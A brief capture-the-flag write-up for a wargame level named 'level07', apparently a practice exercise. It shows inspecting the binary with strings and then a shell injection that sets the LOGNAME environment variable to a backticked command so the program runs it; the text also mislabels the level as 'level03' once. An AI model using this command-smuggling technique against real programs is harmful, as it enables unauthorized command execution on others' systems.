# Level 07

## step 1 : analyze level07
```
$ strings level07
```
we can see that level03 uses LOGNAME, a environment variable.

## step 2 : shell injection
```
$ export LOGNAME="\`getflag\`"
$ ./level07
```
